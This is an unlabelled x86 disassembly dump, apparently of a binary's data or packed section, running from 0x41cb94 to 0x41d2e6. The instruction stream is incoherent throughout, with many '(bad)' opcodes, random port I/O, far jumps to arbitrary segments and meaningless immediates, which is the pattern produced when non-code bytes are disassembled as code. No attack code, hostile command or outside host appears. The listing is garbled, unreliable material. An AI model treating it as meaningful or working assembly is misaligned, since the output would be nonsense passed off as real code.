  41cb94:	sub    BYTE PTR [edi-0x1fa48bd],cl
  41cb9a:	cli    
  41cb9b:	sub    al,dl
  41cb9d:	outs   dx,BYTE PTR ds:[esi]
  41cb9e:	pop    es
  41cb9f:	ins    BYTE PTR es:[edi],dx
  41cba0:	fwait
  41cba1:	ins    BYTE PTR es:[edi],dx
  41cba2:	retf   
  41cba3:	inc    edx
  41cba4:	les    ebp,FWORD PTR [eax-0x6b]
  41cba7:	idiv   BYTE PTR [ebp+0x3f835534]
  41cbad:	cmc    
  41cbae:	jge    0x41cb77
  41cbb0:	(bad)  
  41cbb1:	outs   dx,BYTE PTR ds:[esi]
  41cbb2:	mov    ds,WORD PTR [ebx-0x5963a6fc]
  41cbb8:	bound  esp,QWORD PTR [ebp+edx*2-0x54a2446d]
  41cbbf:	xor    esi,ecx
  41cbc1:	inc    esi
  41cbc2:	fdivr  QWORD PTR [eax]
  41cbc4:	pop    ebx
  41cbc5:	pop    ebx
  41cbc6:	jne    0x41cc34
  41cbc8:	mov    al,ds:0x2ebaffc9
  41cbcd:	mov    al,ds:0xf6b10257
  41cbd2:	dec    edi
  41cbd3:	cmp    si,WORD PTR [ecx-0x1b]
  41cbd7:	jae    0x41cbe9
  41cbd9:	pop    ecx
  41cbda:	mov    ch,0x8
  41cbdc:	push   ebx
  41cbdd:	je     0x41cbc4
  41cbdf:	in     eax,0x68
  41cbe1:	lock inc ebx
  41cbe3:	push   ebx
  41cbe4:	sbb    al,0x24
  41cbe6:	dec    eax
  41cbe7:	lea    esi,[ebp+0x4c04aed5]
  41cbed:	test   DWORD PTR [ecx-0x7],0xf470475d
  41cbf4:	push   ebp
  41cbf5:	retf   
  41cbf6:	jnp    0x41cc2a
  41cbf8:	je     0x41cc6a
  41cbfa:	add    eax,0x180f9f80
  41cbff:	cmp    edx,edi
  41cc01:	push   ebx
  41cc02:	(bad)  
  41cc03:	stc    
  41cc04:	adc    al,0x9d
  41cc06:	stos   BYTE PTR es:[edi],al
  41cc07:	out    0x6e,al
  41cc09:	pop    ss
  41cc0a:	inc    esp
  41cc0b:	xchg   DWORD PTR [esi-0x5e2b7688],ebp
  41cc11:	push   ecx
  41cc12:	xchg   esi,eax
  41cc13:	js     0x41cc45
  41cc15:	mov    al,ds:0xd1a144f1
  41cc1a:	sbb    eax,0x3878b60e
  41cc1f:	in     eax,0x30
  41cc21:	repnz push 0x7a
  41cc24:	fild   DWORD PTR [eax]
	...
  41cc2e:	add    BYTE PTR [eax],al
  41cc30:	add    BYTE PTR [ecx-0x10111089],bl
  41cc36:	(bad)  
  41cc37:	cdq    
  41cc38:	ja     0x41cbcf
  41cc3a:	daa    
  41cc3b:	xor    DWORD PTR ds:0xda93ed92,ecx
  41cc41:	jne    0x41cc8b
  41cc43:	add    DWORD PTR [eax],eax
  41cc45:	lods   al,BYTE PTR ds:[esi]
  41cc46:	add    eax,DWORD PTR [eax]
  41cc48:	add    BYTE PTR [ecx-0x51],bl
  41cc4b:	outs   dx,DWORD PTR ds:[esi]
  41cc4c:	pop    ebp
  41cc4d:	jbe    0x41cc1b
  41cc4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc50:	jbe    0x41cc61
  41cc52:	mov    esp,0x985cd720
  41cc57:	add    esp,esp
  41cc59:	into   
  41cc5a:	sar    BYTE PTR [edi],cl
  41cc5c:	adc    DWORD PTR [edi-0x52],esi
  41cc5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc60:	dec    DWORD PTR [ecx+edx*4-0x152d07af]
  41cc67:	sbb    eax,0x182ca913
  41cc6c:	or     eax,0x4f7bd1ad
  41cc71:	dec    edx
  41cc72:	xchg   ecx,eax
  41cc73:	jnp    0x41cc9b
  41cc75:	mov    WORD PTR [esi-0x86a705e],ds
  41cc7b:	pop    ebp
  41cc7c:	stos   DWORD PTR es:[edi],eax
  41cc7d:	fld    st(7)
  41cc7f:	xor    DWORD PTR [esi+0x60681376],ecx
  41cc85:	in     al,0xef
  41cc87:	push   esi
  41cc88:	aas    
  41cc89:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41cc8b:	les    ebp,FWORD PTR [edi-0x6906e35f]
  41cc91:	pop    ds
  41cc92:	and    al,0x19
  41cc94:	pop    ss
  41cc95:	aaa    
  41cc96:	iret   
  41cc97:	es mov cl,0x94
  41cc9a:	push   ds
  41cc9b:	jae    0x41cc95
  41cc9d:	xchg   edx,ecx
  41cc9f:	push   edi
  41cca0:	into   
  41cca1:	inc    edi
  41cca2:	sar    DWORD PTR [ebp+0x29],1
  41cca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cca6:	out    0xe5,eax
  41cca8:	(bad)  
  41cca9:	mov    dl,0xd6
  41ccab:	out    0xb1,al
  41ccad:	in     al,dx
  41ccae:	inc    ecx
  41ccaf:	cs xor ebp,ebx
  41ccb2:	adc    esi,ebx
  41ccb4:	pop    edx
  41ccb5:	bound  edi,QWORD PTR [ebp-0x17]
  41ccb8:	lea    esp,ds:0xb75ed6d4
  41ccbe:	into   
  41ccbf:	jmp    0x4a89:0x2adc0985
  41ccc6:	lea    edx,[edi]
  41ccc8:	mov    al,ds:0x29985488
  41cccd:	jle    0x41cce6
  41cccf:	das    
  41ccd0:	imul   ebp,DWORD PTR [ebx-0x6d],0x68fb3ac9
  41ccd7:	retf   0x82ba
  41ccda:	js     0x41cc93
  41ccdc:	jge    0x41cc7b
  41ccde:	adc    dh,ah
  41cce0:	cmp    ecx,DWORD PTR [edi-0x7c4b7b4e]
  41cce6:	and    eax,0x11416ff7
  41cceb:	jecxz  0x41cca9
  41cced:	fld    QWORD PTR [ecx]
  41ccef:	int3   
  41ccf0:	inc    ebp
  41ccf1:	mov    es,WORD PTR [esi]
  41ccf3:	pushf  
  41ccf4:	aad    0x3b
  41ccf6:	push   cs
  41ccf7:	xchg   esp,eax
  41ccf8:	sbb    eax,0xdc9ae31
  41ccfd:	xchg   ecx,eax
  41ccfe:	pop    ebx
  41ccff:	xor    DWORD PTR [ecx+0x31432cf1],esi
  41cd05:	xor    BYTE PTR [edi-0x19483475],bl
  41cd0b:	add    edx,ebx
  41cd0d:	push   edi
  41cd0e:	loopne 0x41ccd1
  41cd10:	mov    eax,0x13d7a1b1
  41cd15:	hlt    
  41cd16:	(bad)  
  41cd18:	loope  0x41cd05
  41cd1a:	xor    eax,0xf77c6308
  41cd1f:	(bad)  
  41cd20:	loope  0x41cd10
  41cd22:	pop    ebx
  41cd23:	sub    eax,0xdacf71aa
  41cd28:	pushf  
  41cd29:	sbb    eax,0x3cdf20e3
  41cd2e:	or     ah,BYTE PTR [ecx+eiz*8+0x18]
  41cd32:	mov    esi,DWORD PTR [edi+0x5f]
  41cd35:	xor    BYTE PTR [edi],ch
  41cd37:	add    DWORD PTR [ebx+edi*8],0x6
  41cd3b:	xor    eax,0x5a515fdf
  41cd40:	(bad)  
  41cd41:	dec    esp
  41cd42:	fcomp  DWORD PTR [ebp+ebp*8+0x8cdd8f6]
  41cd49:	imul   ebx,DWORD PTR [ebp+0x3e],0xffffffc0
  41cd4d:	mov    edi,0x4fd8eaea
  41cd52:	repnz dec esi
  41cd54:	pop    esp
  41cd55:	pusha  
  41cd56:	js     0x41cd08
  41cd58:	cmp    BYTE PTR [ecx-0x4ecba098],ch
  41cd5e:	jnp    0x41cd34
  41cd60:	lock lods eax,DWORD PTR ds:[esi]
  41cd62:	xor    ecx,DWORD PTR [edx+edi*8-0x35ed4ba3]
  41cd69:	cmp    DWORD PTR [edx-0x39],0x3342f8ec
  41cd70:	pop    ebp
  41cd71:	push   0x1bd4d525
  41cd76:	dec    esp
  41cd77:	lahf   
  41cd78:	arpl   WORD PTR [eax+0x46c3933f],bx
  41cd7e:	mov    esi,0xde1a539b
  41cd83:	adc    ah,BYTE PTR [eax+0x64]
  41cd86:	sbb    eax,0xc9b271ba
  41cd8b:	or     eax,0x551f4e2d
  41cd90:	inc    esi
  41cd91:	es pusha 
  41cd93:	fisubr DWORD PTR [ecx+0x23e75a42]
  41cd99:	inc    edx
  41cd9a:	enter  0xc69b,0xbd
  41cd9e:	mov    ecx,0x7428edd8
  41cda3:	push   0x256e1ba9
  41cda8:	add    al,BYTE PTR [edx-0x5b95a2f8]
  41cdae:	es xchg ebp,eax
  41cdb0:	daa    
  41cdb1:	stos   DWORD PTR es:[edi],eax
  41cdb2:	xchg   ebx,eax
  41cdb3:	inc    ecx
  41cdb4:	xor    edi,ebx
  41cdb6:	(bad)  
  41cdb7:	inc    edx
  41cdb8:	repnz cmp DWORD PTR [edx],esp
  41cdbb:	mov    esi,DWORD PTR [eax+0x7b]
  41cdbe:	setns  BYTE PTR [eax+0x49]
  41cdc2:	pop    esp
  41cdc3:	mov    dh,0x84
  41cdc5:	ja     0x41cdaf
  41cdc7:	jecxz  0x41ce1c
  41cdc9:	pop    ds
  41cdca:	adc    eax,DWORD PTR [edx]
  41cdcc:	sub    eax,0xaba62c40
  41cdd1:	imul   eax,DWORD PTR [ecx],0x3e
  41cdd4:	xchg   esi,eax
  41cdd5:	adc    al,0xd5
  41cdd7:	pop    ebp
  41cdd8:	fist   WORD PTR [esi-0x320998eb]
  41cdde:	stc    
  41cddf:	std    
  41cde0:	adc    ecx,DWORD PTR [ebx+0x4240a0cb]
  41cde6:	fwait
  41cde7:	pop    edx
  41cde8:	xor    al,0x9e
  41cdea:	loope  0x41cdf7
  41cdec:	dec    ecx
  41cded:	fdiv   DWORD PTR [ecx-0x258ab847]
  41cdf3:	push   edi
  41cdf4:	inc    edx
  41cdf5:	mov    DWORD PTR [edx],eax
  41cdf7:	ja     0x41cd86
  41cdf9:	outs   dx,BYTE PTR gs:[esi]
  41cdfb:	adc    DWORD PTR [edx+0xc],0x73
  41cdff:	scas   eax,DWORD PTR es:[edi]
  41ce00:	int3   
  41ce01:	in     al,dx
  41ce02:	mov    ebx,0xc4a004be
  41ce07:	in     eax,dx
  41ce08:	arpl   WORD PTR [edx],sp
  41ce0a:	xor    esi,DWORD PTR [ecx+0x4]
  41ce0d:	mov    ecx,0x5f68668c
  41ce12:	and    esi,DWORD PTR [edx+esi*4]
  41ce15:	cmp    BYTE PTR [esi-0x49],ch
  41ce18:	add    DWORD PTR [eax],ebp
  41ce1a:	scas   al,BYTE PTR es:[edi]
  41ce1b:	dec    esp
  41ce1c:	aaa    
  41ce1d:	fcomp  DWORD PTR [ebx-0x6d]
  41ce20:	fidiv  WORD PTR [ebx]
  41ce22:	ins    BYTE PTR es:[edi],dx
  41ce23:	dec    edi
  41ce24:	inc    edx
  41ce25:	mov    esp,0x5982bf27
  41ce2a:	adc    al,0x88
  41ce2c:	fcom   st(3)
  41ce2e:	pop    edx
  41ce2f:	clc    
  41ce30:	loopne 0x41ce7c
  41ce32:	ret    
  41ce33:	loopne 0x41cea0
  41ce35:	fsubr  QWORD PTR [eax]
  41ce37:	add    bh,bh
  41ce39:	mov    ebp,0x7a25f661
  41ce3e:	call   0x8a68:0x487429c0
  41ce45:	lock and dh,BYTE PTR ds:0x3369c327
  41ce4c:	into   
  41ce4d:	mov    ebp,0x46076bf0
  41ce52:	cmp    ah,BYTE PTR [eax+0x2d00cb65]
  41ce58:	dec    ebp
  41ce59:	out    0xa6,al
  41ce5b:	imul   esi,DWORD PTR [edi],0xffd3916e
  41ce61:	dec    esi
  41ce62:	and    eax,0x9a643d62
  41ce67:	(bad)  
  41ce68:	in     eax,0x70
  41ce6a:	adc    BYTE PTR [edx-0x793c623a],0x98
  41ce71:	cwde   
  41ce72:	sub    BYTE PTR [ebx],0x62
  41ce75:	add    al,0xa5
  41ce77:	lods   al,BYTE PTR ds:[esi]
  41ce78:	and    DWORD PTR [ebx],eax
  41ce7a:	das    
  41ce7b:	or     DWORD PTR [eax+0xe],0x605bc088
  41ce82:	or     eax,0x2b179587
  41ce87:	in     al,dx
  41ce88:	inc    edx
  41ce89:	imul   edx,DWORD PTR [edx-0x3b92f8aa],0x31
  41ce90:	dec    esi
  41ce91:	cmc    
  41ce92:	xchg   ebp,eax
  41ce93:	aas    
  41ce94:	inc    esi
  41ce95:	adc    BYTE PTR [edi-0xb],bh
  41ce98:	mov    edi,0x9df770c3
  41ce9d:	imul   esi,edi,0x9a08586e
  41cea3:	sub    al,0xc2
  41cea5:	push   ebx
  41cea6:	mov    edi,0x1fabc57d
  41ceab:	adc    eax,0x87f11cb2
  41ceb0:	pop    edi
  41ceb1:	xchg   esi,eax
  41ceb2:	leave  
  41ceb3:	sbb    DWORD PTR [ecx+0xe],ecx
  41ceb6:	jo     0x41ce63
  41ceb8:	or     ebp,DWORD PTR [ebx]
  41ceba:	outs   dx,BYTE PTR ds:[esi]
  41cebb:	jno    0x41ce62
  41cebd:	add    dl,al
  41cebf:	xchg   ecx,eax
  41cec0:	gs pop ecx
  41cec2:	fucomip st,st(3)
  41cec4:	aam    0x7e
  41cec6:	xchg   esi,eax
  41cec7:	cdq    
  41cec8:	xchg   ebx,eax
  41cec9:	fdiv   DWORD PTR [edi+0x75733a6b]
  41cecf:	dec    ebx
  41ced0:	or     bl,ah
  41ced2:	xchg   DWORD PTR [edi+0x51],esi
  41ced5:	rcr    BYTE PTR [ecx+0x53],1
  41ced8:	retf   
  41ced9:	inc    esi
  41ceda:	nop
  41cedb:	dec    esp
  41cedc:	and    DWORD PTR [esi-0x3],esp
  41cedf:	cmc    
  41cee0:	jp     0x41cf07
  41cee2:	mov    eax,0x469dfa68
  41cee7:	and    DWORD PTR [edx-0x60],edx
  41ceea:	push   eax
  41ceeb:	das    
  41ceec:	int3   
  41ceed:	nop    esi
  41cef0:	xlat   BYTE PTR ds:[ebx]
  41cef1:	clc    
  41cef2:	jge    0x41cf2f
  41cef4:	lods   al,BYTE PTR ds:[esi]
  41cef5:	ror    ah,cl
  41cef7:	into   
  41cef8:	jp     0x41ce8d
  41cefa:	call   0x5b344e24
  41ceff:	ffreep st(7)
  41cf01:	sbb    al,0xa4
  41cf03:	push   ebp
  41cf04:	les    ecx,FWORD PTR [eax+ecx*2-0x7]
  41cf08:	xchg   DWORD PTR [edi+edi*8-0x37c86941],esi
  41cf0f:	scas   al,BYTE PTR es:[edi]
  41cf10:	cli    
  41cf11:	add    al,0x5d
  41cf13:	mov    dh,0xe4
  41cf15:	pop    es
  41cf16:	mov    cl,BYTE PTR [edx+0x5c]
  41cf19:	fs push ecx
  41cf1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf1c:	and    eax,0xca4def42
  41cf21:	mov    al,ds:0x383e2eae
  41cf26:	aad    0x51
  41cf28:	(bad)  
  41cf29:	in     al,dx
  41cf2a:	test   al,0xee
  41cf2c:	jno    0x41cf70
  41cf2e:	mov    cl,0xc
  41cf30:	adc    al,0xd6
  41cf32:	xchg   edx,eax
  41cf33:	xchg   ebp,eax
  41cf34:	test   BYTE PTR [esi+0x11],cl
  41cf37:	(bad)  
  41cf38:	fbld   TBYTE PTR [edx-0x37]
  41cf3b:	push   0x5
  41cf3d:	push   cs
  41cf3e:	cdq    
  41cf3f:	fmul   st,st(6)
  41cf41:	in     al,0x33
  41cf43:	pop    esp
  41cf44:	pop    esp
  41cf45:	mov    bh,0x3a
  41cf47:	dec    eax
  41cf48:	push   ecx
  41cf49:	int    0x7d
  41cf4b:	sub    al,0x52
  41cf4d:	push   0x52a4bd95
  41cf52:	ins    BYTE PTR es:[edi],dx
  41cf53:	cmc    
  41cf54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf55:	arpl   WORD PTR [ebp-0x59],sp
  41cf58:	adc    al,0x2
  41cf5a:	jecxz  0x41cf56
  41cf5c:	outs   dx,DWORD PTR ds:[esi]
  41cf5d:	push   0xffffff8d
  41cf5f:	imul   ebp,DWORD PTR [ecx+0x6a],0x861fbb1e
  41cf66:	mov    ecx,0x88bce959
  41cf6b:	dec    ecx
  41cf6c:	fwait
  41cf6d:	adc    al,0xb2
  41cf6f:	xchg   esi,eax
  41cf70:	fs and al,0x13
  41cf73:	push   ebp
  41cf74:	into   
  41cf75:	outs   dx,BYTE PTR ds:[esi]
  41cf76:	and    esp,0x9ab58d6f
  41cf7c:	mov    ah,0x73
  41cf7e:	fs gs jno 0x41cf6a
  41cf82:	fidivr DWORD PTR [edx]
  41cf84:	mov    ch,0xaf
  41cf86:	and    DWORD PTR [esi+edi*2],edx
  41cf89:	int3   
  41cf8a:	xor    DWORD PTR [ecx-0x6536925d],ebp
  41cf90:	push   ds
  41cf91:	jl     0x41cf87
  41cf93:	mov    ds:0xc5fd18d9,al
  41cf98:	mov    ch,0xbe
  41cf9a:	and    ch,BYTE PTR [ecx+ebx*2+0x5b]
  41cf9e:	fistp  WORD PTR [esi+0x4deaaca8]
  41cfa4:	mov    dh,0xbb
  41cfa6:	ja     0x41cf6f
  41cfa8:	push   ebp
  41cfa9:	jmp    FWORD PTR [ebx+0x25]
  41cfac:	xchg   BYTE PTR [esp+eax*4],cl
  41cfaf:	rcr    DWORD PTR [ebx+0x69957d50],1
  41cfb5:	es sti 
  41cfb7:	lods   eax,DWORD PTR ds:[esi]
  41cfb8:	loope  0x41cfc1
  41cfba:	lahf   
  41cfbb:	aam    0x29
  41cfbd:	add    bl,dh
  41cfbf:	lds    ecx,FWORD PTR [esi]
  41cfc1:	fs push cs
  41cfc3:	jg     0x41cfdb
  41cfc5:	jb     0x41cf75
  41cfc7:	jmp    0x94ef:0xd3a27fe6
  41cfce:	add    al,0x5c
  41cfd0:	sbb    dh,0x15
  41cfd3:	xor    eax,0xf9802e3d
  41cfd8:	in     eax,0x8c
  41cfda:	leave  
  41cfdb:	pop    ecx
  41cfdc:	cmp    eax,eax
  41cfde:	pusha  
  41cfdf:	jmp    0x41cfdc
  41cfe1:	xor    BYTE PTR [ebp-0x4b],bh
  41cfe4:	loope  0x41d03f
  41cfe6:	aas    
  41cfe7:	call   DWORD PTR [edx]
  41cfe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfea:	pusha  
  41cfeb:	fst    QWORD PTR [edi]
  41cfed:	retf   
  41cfee:	into   
  41cfef:	sbb    ah,bh
  41cff1:	mov    al,0x73
  41cff3:	retf   0x1d
	...
  41cffe:	add    BYTE PTR [eax],al
  41d000:	add    BYTE PTR [edx-0x217875bc],dl
  41d006:	iret   
  41d007:	lahf   
  41d008:	push   ebp
  41d009:	loop   0x41cf9a
  41d00b:	aad    0x3
  41d00d:	jb     0x41d03e
  41d00f:	add    bl,BYTE PTR [ecx+eiz*1]
  41d012:	dec    esp
  41d013:	add    DWORD PTR [eax],eax
  41d015:	lods   al,BYTE PTR ds:[esi]
  41d016:	add    eax,DWORD PTR [eax]
  41d018:	add    bl,dl
  41d01a:	add    BYTE PTR [esi],0x45
  41d01d:	fadd   DWORD PTR [edi]
  41d01f:	mov    WORD PTR [edi],fs
  41d021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d022:	in     al,0x1f
  41d024:	lds    eax,FWORD PTR [ecx+0x14]
  41d027:	lds    esi,FWORD PTR [edi-0x6b9d8408]
  41d02d:	mov    dh,0x83
  41d02f:	lahf   
  41d030:	xchg   DWORD PTR [ebx-0x5cc0383f],edx
  41d036:	(bad)  
  41d038:	inc    ebx
  41d039:	in     al,0xaf
  41d03b:	hlt    
  41d03c:	xchg   esp,eax
  41d03d:	jge    0x41cffc
  41d03f:	sub    DWORD PTR gs:[ecx],edx
  41d042:	jle    0x41d018
  41d044:	rcr    DWORD PTR [edx-0x65d4dc80],cl
  41d04a:	push   es
  41d04b:	js     0x41d023
  41d04d:	imul   edi,DWORD PTR [ebx-0x76],0x6b17f4b0
  41d054:	xor    DWORD PTR [esi-0x491ab99a],ecx
  41d05a:	ret    0x3da7
  41d05d:	std    
  41d05e:	cmp    al,0x51
  41d060:	xchg   ecx,eax
  41d061:	cmp    eax,0xb0ca277f
  41d066:	dec    ebp
  41d067:	lods   al,BYTE PTR ds:[esi]
  41d068:	mov    ds:0xe9629e3b,al
  41d06d:	push   0x27
  41d06f:	push   ecx
  41d070:	pusha  
  41d071:	nop
  41d072:	pop    edx
  41d073:	sub    al,0x7e
  41d075:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d077:	push   ss
  41d078:	mov    esi,0x9f0069fc
  41d07d:	mov    edx,0xccd27102
  41d082:	mov    bh,0x69
  41d084:	scas   eax,DWORD PTR es:[edi]
  41d085:	shl    DWORD PTR [eax+0x7e],1
  41d088:	das    
  41d089:	(bad)  
  41d08a:	pop    ebp
  41d08b:	mov    eax,ds:0x7b014306
  41d090:	jo     0x41d02c
  41d092:	retf   0x7a21
  41d095:	adc    ah,BYTE PTR [edx+ecx*1+0x66]
  41d099:	and    ebp,edi
  41d09b:	pop    eax
  41d09c:	xchg   esi,eax
  41d09d:	jle    0x41d052
  41d09f:	sbb    eax,eax
  41d0a1:	mov    WORD PTR [eax-0x50aef5c8],fs
  41d0a7:	adc    al,0xd
  41d0a9:	or     al,0xf
  41d0ab:	gs test al,0x34
  41d0ae:	imul   edi,DWORD PTR [edi-0xf5f0a0a],0x185713e8
  41d0b8:	scas   eax,DWORD PTR es:[edi]
  41d0b9:	jae    0x41d132
  41d0bb:	adc    cl,BYTE PTR [esi-0x2f]
  41d0be:	jne    0x41d0d7
  41d0c0:	inc    edx
  41d0c1:	or     DWORD PTR [edi+0x10ad707],ebp
  41d0c7:	lock cmp ah,ah
  41d0ca:	adc    BYTE PTR [eax+0x4b6732ae],al
  41d0d0:	xchg   ecx,eax
  41d0d1:	in     eax,0xb4
  41d0d3:	mov    DWORD PTR [esi+0x14],eax
  41d0d6:	xor    al,0x18
  41d0d8:	dec    esi
  41d0d9:	sub    eax,0x50c1738
  41d0de:	cmp    eax,DWORD PTR [ecx+0x73]
  41d0e1:	fs ja  0x41d06b
  41d0e4:	les    edx,FWORD PTR [ecx]
  41d0e6:	sbb    cl,BYTE PTR [esi-0x63]
  41d0e9:	inc    edx
  41d0ea:	adc    BYTE PTR ds:0x76498c73,0x1c
  41d0f1:	cmp    dl,0x46
  41d0f4:	adc    ch,bh
  41d0f6:	xor    esp,DWORD PTR [ebp-0x2bb2d23d]
  41d0fc:	adc    dl,BYTE PTR [ecx-0x9]
  41d0ff:	aam    0x62
  41d101:	rol    DWORD PTR [edx-0x4e],0x25
  41d105:	imul   ecx,esp,0x3cc81f15
  41d10b:	sub    al,0xe8
  41d10d:	push   ebp
  41d10e:	fadd   DWORD PTR [ebp+0xd]
  41d111:	mov    WORD PTR [edx],cs
  41d113:	dec    esi
  41d114:	cmp    BYTE PTR [edi+0x26],ch
  41d117:	xor    si,sp
  41d11a:	addr16 mov eax,0x373e176b
  41d120:	jmp    DWORD PTR [esi]
  41d122:	xor    al,0xfb
  41d124:	cli    
  41d125:	hlt    
  41d126:	popf   
  41d127:	inc    edi
  41d128:	pop    eax
  41d129:	dec    esp
  41d12a:	pop    ebx
  41d12b:	out    0x28,al
  41d12d:	ds sub ebx,ebp
  41d130:	and    bl,0x9a
  41d133:	push   ebx
  41d134:	or     DWORD PTR [eax-0x5da2042],edi
  41d13a:	add    al,0xb5
  41d13c:	pop    edi
  41d13d:	xchg   esi,eax
  41d13e:	jae    0x41d165
  41d140:	xor    al,0x90
  41d142:	inc    esi
  41d143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d144:	(bad)  
  41d146:	es xchg edi,eax
  41d148:	lahf   
  41d149:	pop    ebp
  41d14a:	call   0x8e3267d3
  41d14f:	shl    DWORD PTR [eax-0x1],0xb3
  41d153:	mov    eax,0x49b95b79
  41d158:	xor    dl,BYTE PTR [edx+0x73]
  41d15b:	pop    esi
  41d15c:	dec    esp
  41d15d:	test   edx,esp
  41d15f:	enter  0xa78c,0x5a
  41d163:	xor    ebx,DWORD PTR ds:0x7e5529aa
  41d169:	mov    ebp,0xf0ecd164
  41d16e:	jecxz  0x41d192
  41d170:	ins    BYTE PTR es:[edi],dx
  41d171:	call   0x5f816d95
  41d176:	add    DWORD PTR [ebp+0x5bff77f9],0xffffff9a
  41d17d:	jae    0x41d1f5
  41d17f:	sub    edi,DWORD PTR [edi+0x76f8ea09]
  41d185:	pop    edi
  41d186:	data16 (bad) 
  41d188:	cmp    eax,0x53dc3e98
  41d18d:	sbb    eax,0xef69bb2b
  41d192:	inc    esp
  41d193:	ficom  WORD PTR [ecx+0xa]
  41d196:	pop    edi
  41d197:	add    dh,BYTE PTR [eax+0x54]
  41d19a:	mov    al,ds:0x2df1e283
  41d19f:	mov    DWORD PTR [ecx-0x4f],ecx
  41d1a2:	loope  0x41d158
  41d1a4:	(bad)  
  41d1a5:	(bad)  
  41d1a7:	push   edi
  41d1a8:	sub    eax,0xa88dd0bf
  41d1ad:	xor    al,0x4d
  41d1af:	outs   dx,BYTE PTR ds:[esi]
  41d1b0:	(bad)  
  41d1b1:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1b3:	adc    esp,esp
  41d1b5:	and    al,0xda
  41d1b7:	out    dx,eax
  41d1b8:	push   ebp
  41d1b9:	pop    edi
  41d1ba:	jp     0x41d1d0
  41d1bc:	sub    BYTE PTR [ebp+0x3120be1],dh
  41d1c2:	dec    edx
  41d1c3:	mov    ds:0xf8a8667d,al
  41d1c8:	fst    DWORD PTR [esi]
  41d1ca:	xlat   BYTE PTR ds:[ebx]
  41d1cb:	stc    
  41d1cc:	sbb    al,0x21
  41d1ce:	pop    edi
  41d1cf:	les    ecx,FWORD PTR fs:[ebx]
  41d1d2:	loop   0x41d238
  41d1d4:	iret   
  41d1d5:	not    BYTE PTR [esi+0x2f03d61]
  41d1db:	cld    
  41d1dc:	lods   eax,DWORD PTR ds:[esi]
  41d1dd:	push   ds
  41d1de:	mov    DWORD PTR [ecx+edi*2-0xf380db7],esp
  41d1e5:	mov    edx,0x5ac8e8aa
  41d1ea:	fbld   TBYTE PTR [edx+0x63]
  41d1ed:	push   eax
  41d1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1ef:	out    0x8c,al
  41d1f1:	sbb    eax,0x321452f6
  41d1f6:	dec    ebp
  41d1f7:	arpl   si,sp
  41d1f9:	sbb    ebx,DWORD PTR [edi-0x377d5d92]
  41d1ff:	clc    
  41d200:	gs int 0xe6
  41d203:	mov    edx,0xa5ddcfe4
  41d208:	push   ebp
  41d209:	or     al,0xbb
  41d20b:	arpl   WORD PTR [eax],cx
  41d20d:	sub    DWORD PTR [ecx],edx
  41d20f:	fs dec ebp
  41d211:	iret   
  41d212:	and    ah,BYTE PTR [edx+0x35f7c43]
  41d218:	xor    edi,eax
  41d21a:	pop    ecx
  41d21b:	and    esi,DWORD PTR [ecx+0x6a3d8622]
  41d221:	or     BYTE PTR [eax],0xd7
  41d224:	mov    ah,dh
  41d226:	jmp    0x41d1dc
  41d228:	enter  0x43c2,0x7d
  41d22c:	repnz sub al,0x7
  41d22f:	ror    BYTE PTR ds:0x3775f32d,cl
  41d235:	fwait
  41d236:	pop    esi
  41d237:	and    eax,0x4c96f605
  41d23c:	js     0x41d239
  41d23e:	cld    
  41d23f:	mov    edx,0x47b876d2
  41d244:	mov    eax,0x2e25edef
  41d249:	ret    0x2e8c
  41d24c:	gs scas al,BYTE PTR es:[edi]
  41d24e:	mov    esp,0xcef100fd
  41d253:	pop    edi
  41d254:	adc    ah,BYTE PTR [ebp+0x23a2c544]
  41d25a:	scas   eax,DWORD PTR es:[edi]
  41d25b:	aaa    
  41d25c:	lds    ecx,FWORD PTR [edi-0x75578f80]
  41d262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d263:	fisttp DWORD PTR [ecx+0xe11b58b]
  41d269:	fldenv [esi+ebx*1+0x2e]
  41d26d:	jecxz  0x41d1f9
  41d26f:	cmp    BYTE PTR [edx],dl
  41d271:	pop    edi
  41d272:	add    al,0x99
  41d274:	sbb    eax,0x103b6c5e
  41d279:	scas   al,BYTE PTR es:[edi]
  41d27a:	les    edx,FWORD PTR [edi+0x4f3a27bc]
  41d280:	pop    esp
  41d281:	test   dl,0x77
  41d284:	mul    al
  41d286:	jge    0x41d2f7
  41d288:	ja     0x41d226
  41d28a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d28b:	(bad)  
  41d28d:	cs inc eax
  41d28f:	or     cl,BYTE PTR [ebx]
  41d291:	push   ebx
  41d292:	push   esp
  41d293:	jo     0x41d306
  41d295:	push   ss
  41d296:	fldlg2 
  41d298:	fnstenv [ebx-0x7b]
  41d29b:	jl     0x41d248
  41d29d:	gs jbe 0x41d2dd
  41d2a0:	sahf   
  41d2a1:	pop    ebp
  41d2a2:	gs sub al,0xeb
  41d2a5:	push   ds
  41d2a6:	lods   eax,DWORD PTR ds:[esi]
  41d2a7:	arpl   WORD PTR [ebx+ebx*1+0x41],dx
  41d2ab:	pop    esp
  41d2ac:	xchg   dl,bh
  41d2ae:	call   0x5a96:0xa9337b26
  41d2b5:	jns    0x41d252
  41d2b7:	in     eax,0x1f
  41d2b9:	add    edi,edi
  41d2bb:	cs loope 0x41d339
  41d2be:	xor    eax,0x275bcb48
  41d2c3:	cld    
  41d2c4:	dec    eax
  41d2c5:	sub    dl,BYTE PTR [ebp+0x3f]
  41d2c8:	jge    0x41d308
  41d2ca:	mov    ecx,0x9aa9ff1f
  41d2cf:	mov    ah,0x66
  41d2d1:	mov    BYTE PTR [edi],cl
  41d2d3:	dec    edi
  41d2d4:	sub    ch,dl
  41d2d6:	mov    ch,0x6f
  41d2d8:	leave  
  41d2d9:	enter  0xb3dc,0xd8
  41d2dd:	fmul   QWORD PTR [eax-0x267bec9e]
  41d2e3:	adc    ch,0x24
  41d2e6:	(bad)  
